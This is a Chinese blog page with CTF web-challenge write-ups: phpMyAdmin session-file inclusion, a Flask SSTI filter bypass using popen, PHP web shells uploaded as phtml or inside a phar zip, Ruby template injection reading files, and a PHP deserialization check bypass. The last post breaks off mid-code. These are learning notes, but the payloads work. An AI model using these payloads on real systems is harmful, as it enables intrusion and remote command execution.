<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>这题目当时卡死是因为没意识到guest/guest账号的存在，亏我还用50000条弱密码在爆破root密码，欸，要不然是可以做出来的。<br>首先可以查看下info.php，里面有一些最基本的信息。<br>使用guest/guest登入，发现这个东西:<br><img src="/images/22/11.png" alt=""><br>这东西写在这摆明了说来日我啊，这个可以联想到之前Chamd5爆出的这个漏洞：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br>具体源码分析可以看这一篇文章，接着利用点就很清晰了，我们只要把命令写进本地文件，然后通过本地文件包含执行命令就能拿到flag。这里我们可以利用session文件，session文件会记录当前cookies用户的操作，我们只要执行一个包含了命令的操作就行了。接下来就很简单了。<br>首先我们记录下现在cookies中phpmyadmin的值，为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ft262cg8vj2v0r8feei75nlveojcmu32</span><br></pre></td></tr></table></figure></p>
<p>通过执行查询操作，把我们的命令写入本地文件:<br><img src="/images/22/12.png" alt=""><br>写入成功利用本地文件包含漏洞执行命令，session文件默认保存在/tmp/sess_你的sessionid下:<br><img src="/images/22/13.png" alt=""><br>可以看到命令成功执行了，接着读取根目录文件，发现下面有个nctfffffffff文件，读取得到flag:<br><img src="/images/22/14.png" alt=""></p>
<h2 id="flask真香"><a href="#flask真香" class="headerlink" title="flask真香"></a>flask真香</h2><p>这看题目第一反应就是ssti,进去一测试，果不其然:<br><img src="/images/22/15.png" alt=""><br>接着测试发现config，items，for，mro等等都被过滤了，但是有个特点，在我测试双写绕过时发现了这貌似是个贪婪模式，没办法进行绕过，但是前段时间Tykyo里面有道题目是把config置换为了none了，我在想会不会这里也是一样的，接着测试，发现了果然是这样:<br><img src="/images/22/16.png" alt=""><br>接着普及几个魔术方法，这些都是用来找类调用所使用的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure></p>
<p>首先找到object类:<br><img src="/images/22/17.png" alt=""><br>查看有啥可利用的子类:<br><img src="/images/22/18.png" alt=""><br>emmmm，在357位置找到了了一个warnings，这下面是可以调用os模块的，接着调出可以执行命令的函数popen就可以读取文件了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__claconfigss__.__baconfigse__.__subclaconfigsses__()[357]()._module.__buiconfigltins__[&apos;__imconfigport__&apos;](&apos;oconfigs&apos;).poconfigpen(&apos;ls -a&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在根目录下发现了Th1s__is_S3cret文件，读取文件就能得到flag.</p>
<h2 id="Funny-Emoji-I"><a href="#Funny-Emoji-I" class="headerlink" title="Funny_Emoji I"></a>Funny_Emoji I</h2><p>这题目特别有意思，里面表情包可好玩了！<br>打开链接，发现有个emoji功能，但是需要登入，既然有注册页面那就先注册，进去emoji功能界面:<br><img src="/images/22/19.png" alt=""><br>发现我们可以选择图片，下面有个文本框可以任意输入，点击旁边的按钮就能得到表情包。不过在查看页面源代码的时候发现了这样一点:<br><img src="/images/22/20.png" alt=""><br>这会远程加载一个文件，我们可以访问一下，尝试更改参数发现了，image.php会根据我们传入的name参数改变图片样式。<br>接着没啥思路了…..不过刚刚查看源码的时候，发现了一段js混淆加密的代码，解码发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function encccccrypt(s) &#123;</span><br><span class="line">    flag = &apos;&apos;;</span><br><span class="line">    for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class="line">        flag += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length))</span><br><span class="line">    &#125;</span><br><span class="line">    return btoa(flag)</span><br><span class="line">&#125;</span><br><span class="line">var key = &apos;nctf23333&apos;;</span><br><span class="line"></span><br><span class="line">function hold_data(s) &#123;</span><br><span class="line">    return s.replace(&apos;\n&apos;, &apos;%0a&apos;)</span><br><span class="line">&#125;</span><br><span class="line">var enccccrypt = atob;</span><br><span class="line"></span><br><span class="line">function get_images() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    i.src = &quot;images/&quot; + s.options[index].value + &quot;.jpg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_my_image() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima2&apos;);</span><br><span class="line">    var t = document.getElementById(&apos;text&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    var im_name = s.options[index].value;</span><br><span class="line">    var im_text = t.value;</span><br><span class="line">    var ptl = encccccrypt(enccccrypt(&quot;ZGF0YTovL3RleHQvcGxhaW4s&quot;));</span><br><span class="line">    var data = hold_data(im_text);</span><br><span class="line">    i.src = &quot;image.php?name=&quot; + im_name + &quot;&amp;data=&quot; + data + &quot;&amp;ptl=&quot; + ptl</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先把里面可疑一段base64解码，发现:<br><img src="/images/22/21.png" alt=""><br>emmmm，这貌似可以通过data协议写入shell。按照它加密的方式我们尝试这样的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是回显不太对：<br><img src="/images/22/22.png" alt=""><br>按照原来的字符输出了，这里让我想到一篇文章，说的是如果使用file_put_contents()函数测试，那么会按照原来的字符串输出，所以尝试读一下flag.php，因为data参数的值是接在ptl参数后的，所以data参数不传值，flag到手:<br><img src="/images/22/23.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/28/NCTF-Web-wp/" data-id="cjv4r4s00002mmcvj5phmug7n" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛的归纳总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/18/近期比赛的归纳总结/" class="article-date">
  <time class="post-time" datetime="2018-11-18T15:38:27.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">18</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/18/近期比赛的归纳总结/">近期比赛的归纳总结</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛一波接一波，但是我又是忙着演出排练没时间打，好不容易抽出时间来比赛又被打的自闭又自闭，写个博客记录一下原来没注意过的小技巧和骚操作吧。</p>
<h2 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h2><p>说来惭愧，这是新生赛的一道题目，真的学到了这个技巧。<br>打开页面是一个普通的界面，上传png文件发现了一个过滤：<br><img src="/images/21/1.png" alt=""><br>碰到这种过滤，我们可以使用phtml的文件来进行绕过，phtml文件可以把文件中存在html的标签进行处理再作为php文件执行，我们可以上传一个如下的phtml的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">system($_GET[&apos;a&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着找到文件目录执行?a=cd ..;ls查看文件，读取flag.php就行了。</p>
<h2 id="Crazy-Train"><a href="#Crazy-Train" class="headerlink" title="Crazy Train"></a>Crazy Train</h2><p>这题目真的学到了很多东西。这是一道关于Ruby的SSTI注入的题目，里面的技巧会慢慢讲。<br>打开网站发现只是一个简单的留言系统，只有一个新建文章的功能：<br><img src="/images/21/2.png" alt=""><br>点进去发现只有文章标题和文章内容可以编辑：<br><img src="/images/21/3.png" alt=""><br>emmmmm，一开始我是想尝试xss的，但是发现我们好像并不能确定文章是否传过去了，也不能确认是否有admin查看我们的文章，所以只能尝试其他思路…..抓包看看有没有可疑参数：<br><img src="/images/21/4.png" alt=""><br>发现了一个隐藏的参数，结合刚刚我们传文章过去无回显可以猜测一下是不是ssti注入，使用BuiltWith确定框架是Ruby，接着可以尝试一下如下攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 2 * 2 %&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/21/5.png" alt=""><br>接下来就简单多了，查了查Ruby的File类读文件调用方式，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File.open(&apos;路径&apos;).read</span><br></pre></td></tr></table></figure></p>
<p>尝试读取/etc/passwd:<br><img src="/images/21/6.png" alt=""><br>接下来的问题就是不知道我们所读取flag的路径在哪里，经过查阅Ruby有关dir类发现了这样一个函数：<br><img src="/images/21/7.png" alt=""><br>接下来就简单了，毕竟什么过滤也没有，操作如下：<br><img src="/images/21/8.png" alt=""><br><img src="/images/21/9.png" alt=""><br><img src="/images/21/10.png" alt=""></p>
<h2 id="Archivr"><a href="#Archivr" class="headerlink" title="Archivr"></a>Archivr</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>emmmmm，睡了一觉起来发现题目已经关了，真的无语，下一次尽量熬夜复现完吧。<br>点开链接发现是一个可以上传文件的系统，但是只能上传小于5kb的文件，上传文件会得到一个key，通过这个key能下载我们这个文件，不过链接的参数有一个可利用漏洞，文件包含：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/index.php?page=upload</span><br></pre></td></tr></table></figure></p>
<p>利用文件包含漏洞就能读取出所有的源码，初步审计一波，我把有价值的给挑出来分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) &#123;</span><br><span class="line">    if ($_FILES[&apos;upload&apos;][&apos;size&apos;] &gt; 5000) &#123; //max 5KB</span><br><span class="line">        die(&quot;File too large!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_FILES[&apos;upload&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $upload_time = time();</span><br><span class="line">    $upload_dir = &quot;uploads/&quot; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . &quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $ext = &quot;&quot;;</span><br><span class="line">    if (strpos($filename, &apos;.&apos;) !== false) &#123;</span><br><span class="line">        $f_ext = explode(&quot;.&quot;, $filename)[1];</span><br><span class="line">        if (ctype_alnum($f_ext) &amp;&amp; stripos($f_ext, &quot;php&quot;) === false &amp;&amp; stripos($f_ext, &quot;pht&quot;) === false) &#123;</span><br><span class="line">            $ext = &quot;.&quot; . $f_ext;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ext = &quot;.dat&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $ext = &quot;.dat&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_path = $upload_dir . md5($upload_time) . $ext;</span><br><span class="line">    mkdir($upload_dir, 0770, true);</span><br><span class="line"></span><br><span class="line">    //Enforce maximum of 10 files</span><br><span class="line">    $dir = new DirLister($upload_dir);</span><br><span class="line">    if ($dir-&gt;getCount() &gt;= 10) &#123;</span><br><span class="line">        unlink($upload_dir . $dir-&gt;getOldestFile());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($_FILES[&apos;upload&apos;][&apos;tmp_name&apos;], $upload_path);</span><br><span class="line">    $key = $upload_time . $ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里给了上传文件的储存目录生成方式，以及两个黑名单，通过检查php?或者pht?来过滤文件的后缀名。目录通过获取我们的ip地址以及当前的时间戳来生成最终地址。  </p>
<h3 id="phar协议"><a href="#phar协议" class="headerlink" title="phar协议"></a>phar协议</h3><p>题目过滤了php，php5，phtml等等，通过用一些后缀名来绕过貌似行不通，这里用到了一种协议-phar协议。<br>phar协议适用于php&gt;5.3.0版本，官方文档如下：<br><img src="/images/21/11.png" alt=""><br>简单来说，就是一个打包解包的过程，在我们传输压缩文件的时候，服务器会对压缩包进行解压然后执行文件内容，也就是说我们可以利用phar协议去解析我们上传的压缩包，例如：<br>我们新建一个php文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo system($_GET[&quot;a&quot;]); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>将它压缩为zip文件，然后上传使用phar协议去读取../../xxx.zip/xxx.php就能执行任意命令了。 </p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>一般来说，我们通过外网的服务器去请求内网数据的时候，外网的代理服务器就像一个跳板一样，让我们通过它去访问内网的服务器，正向代理的服务器作用也仅仅是作为跳板，但是反向代理不一样，我们访问反向代理服务器，代理服务器会通过自己的ip去访问内网服务器，然后将接受的信息返回给我们，反向代理服务器对外表现就像是一个内网服务器一样。具体分析可以参考：<br><a href="https://www.cnblogs.com/Anker/p/6056540.html" target="_blank" rel="noopener">https://www.cnblogs.com/Anker/p/6056540.html</a>  </p>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>既然我们可以通过phar协议去执行命令，那么现在问题就是如何找到目录，我们在源码中看到了服务器会将我们的ip进行md5然后加上当前时间戳的md5加后缀名来生成路径，但是在我加密了我的ip，去访问路径的时候发现返回了404，这就很奇怪，按理来说应该没问题，但是目录不存在是怎么回事？<br>这就是反向代理的原因了，我们访问的服务器是一个代理服务器，而我们所要的资源则是在内网服务器上，所以代理服务器在访问内网资源时，所用的ip就是它本身ip，并不是我们自身的ip，那问题又来了，我们如何得到服务器ip呢？<br>一个大师傅想到了所有的题目都是部署在一个服务器上，那么可以通过其他的题目来获取ip地址啊，例如上一题的Ruby SSTI注入，我们可以获取所有环境变量的信息：<br><img src="/images/21/12.png" alt=""><br><img src="/images/21/13.png" alt=""><br>通过request类来读取服务器ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@_request.instance_variable_get(:env)</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/21/14.png" alt=""><br>上传zip文件，接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/uploads/98d3cbed97b0bc491c000455c9f8e6fb/md5(time()).zip/1.php?a=ls</span><br></pre></td></tr></table></figure></p>
<p>读flag文件就行了。  </p>
<h2 id="php-is-funny-chal8"><a href="#php-is-funny-chal8" class="headerlink" title="php_is_funny_chal8"></a>php_is_funny_chal8</h2><p>最近刷题接触到了几道反序列化问题，发现有道题目还是挺好的，补充了一个新的知识点。<br>题目点开扫目录，发现了一个index.php.bak，审计一波代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;open_basedir&quot;,dirname(__FILE__));</span><br><span class="line">#GOAL: file_get_content(&apos;sbztz.php&apos;)    : )</span><br><span class="line">   </span><br><span class="line">    class just4fun &#123;</span><br><span class="line">        public $filename;</span><br><span class="line">   </span><br><span class="line">        function __toString() &#123;</span><br><span class="line">            return @file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $data = stripslashes($_GET[&apos;data&apos;]);</span><br><span class="line">    if (!$data) &#123;</span><br><span class="line">        die(&quot;hello from y&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    echo unserialize($data);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- ./challenge8.php.bak --&gt;</span><br></pre></td></tr></table></figure></p>
<p>题目要求就是让我们把sbztz.php给包含出，源码给出了一个类，类里面有一个__toString()函数，只要我们通过序列化触发类里面的函数就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class just4fun &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return @file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new just4fun(&quot;a&quot;);</span><br><span class="line">$a-&gt;filename = &quot;sbztz.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是源码有一个过滤需要绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>emmm，也就是说我们输入的data不能是例如开头为<strong>O:123:</strong>这种类型的，这里提供了一种比较特殊的绕过方式，分析可以看这篇文章:<a href="http://www.phpbug.cn/archives/32.html。" target="_blank" rel="noopener">http://www.phpbug.cn/archives/32.html。</a><br>里面提到了在我们生成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个payload，在Object后加个+依旧可以正常的反序列化，所以最终payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PS:直接传参还不行，必须对符号都进行url编码才能得到flag，具体原因不太清楚.</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/18/近期比赛的归纳总结/" data-id="cjv4r4s09002vmcvjfx8sho2g" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-结合CVE的一道命令执行弹shell的题目" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/" class="article-date">
  <time class="post-time" datetime="2018-11-01T08:22:00.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/">结合CVE的一道命令执行弹shell的题目</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>这是hackme一道题目，这道题目结合了一个高危的cve以及弹shell的操作，从这题目学到了挺多东西的，为此把这道题目记录一下。</p>
<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>题目地址：<a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/</a><br>打开发现网页有几个明显的功能：<br><img src="/images/20/1.png" alt=""><br>第一个页面是man的函数说明，第二个功能是则是上传文件，第三个功能就是输入命令执行了，但是被限制的很死，也就是说只能执行ls以及env，第四个就是ls读取文件，但是只能读取四个目录的文件，不过问题不大，可以更改file参数来更改读取目录。不过点点的时候发现了一个很明显的漏洞：<br><img src="/images/20/2.png" alt=""><br>这里很容易想到可以尝试用文件包含来读取源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>读取出index.php源码，挑出一些值得审计的代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; 